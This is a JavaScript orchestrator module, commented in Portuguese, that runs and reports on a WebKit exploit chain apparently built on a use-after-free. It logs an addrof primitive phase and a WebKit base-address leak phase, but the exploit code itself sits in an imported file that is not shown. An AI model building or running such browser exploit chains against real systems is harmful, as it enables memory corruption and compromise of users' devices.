// js/script3/runAllAdvancedTestsS3.mjs (ORQUESTRADOR FINAL)

import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import {
    executeTypedArrayVictimAddrofAndWebKitLeak_R43, 
    FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT
} from './testArrayBufferVictimCrash.mjs';

async function runRobustExploitStrategy() {
    const FNAME_RUNNER = "runRobustExploitStrategy"; 
    logS3(`==== INICIANDO Estratégia Robusta (${FNAME_RUNNER}) ====`, 'test', FNAME_RUNNER);
    
    const result = await executeTypedArrayVictimAddrofAndWebKitLeak_R43();
    const module_name_for_title = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;

    if (result.errorOccurred) {
        logS3(`  RUNNER: Teste principal capturou um ERRO: ${String(result.errorOccurred)}`, "critical", FNAME_RUNNER);
        document.title = `${module_name_for_title}: Test ERR!`;
    } else if (result) {
        logS3(`  RUNNER: Teste completou. Analisando resultados...`, "good", FNAME_RUNNER);

        const addrofResult = result.addrof_result;
        const webkitLeakResult = result.webkit_leak_result;

        // Reporta o resultado da Fase 1 (Construção da Primitiva Addrof)
        if (addrofResult) {
            logS3(`  RUNNER (Fase 1 - Primitiva Addrof): ${addrofResult.msg}`, addrofResult.success ? "vuln" : "warn", FNAME_RUNNER);
        }

        // Reporta o resultado da Fase 2 (WebKit Leak)
        if (webkitLeakResult) {
            logS3(`  RUNNER (Fase 2 - WebKit Leak): ${webkitLeakResult.msg}`, webkitLeakResult.success ? "vuln" : "warn", FNAME_RUNNER);
             if(webkitLeakResult.webkit_base_candidate) {
                logS3(`    SUCESSO FINAL: Base do WebKit encontrada em ${webkitLeakResult.webkit_base_candidate}`, "leak", FNAME_RUNNER);
            }
        }

        // Define o título final da página com base no sucesso geral
        if (webkitLeakResult?.success) {
            document.title = `${module_name_for_title}: WebKitLeak SUCCESS!`;
        } else if (addrofResult?.success) {
            document.title = `${module_name_for_title}: Addrof OK, WebKitLeak Fail`;
        } else {
            document.title = `${module_name_for_title}: Full Chain Fail`;
        }
    } else {
        logS3(`  RUNNER: Formato de resultado inválido recebido.`, "critical", FNAME_RUNNER);
        document.title = `${module_name_for_title}: Invalid Result Obj`;
    }

    logS3(`  Título da página final: ${document.title}`, "info", FNAME_RUNNER);
    await PAUSE_S3(MEDIUM_PAUSE_S3);
    logS3(`==== Estratégia Robusta (${FNAME_RUNNER}) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}


export async function runAllAdvancedTestsS3() {
    const FNAME_ORCHESTRATOR = `Robust_UAF_MainOrchestrator`;
    logS3(`==== INICIANDO Script 3 (${FNAME_ORCHESTRATOR}) ... ====`, 'test', FNAME_ORCHESTRATOR);
    
    await runRobustExploitStrategy();

    logS3(`\n==== Script 3 (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    const runBtn = getRunBtnAdvancedS3(); if (runBtn) runBtn.disabled = false;
}
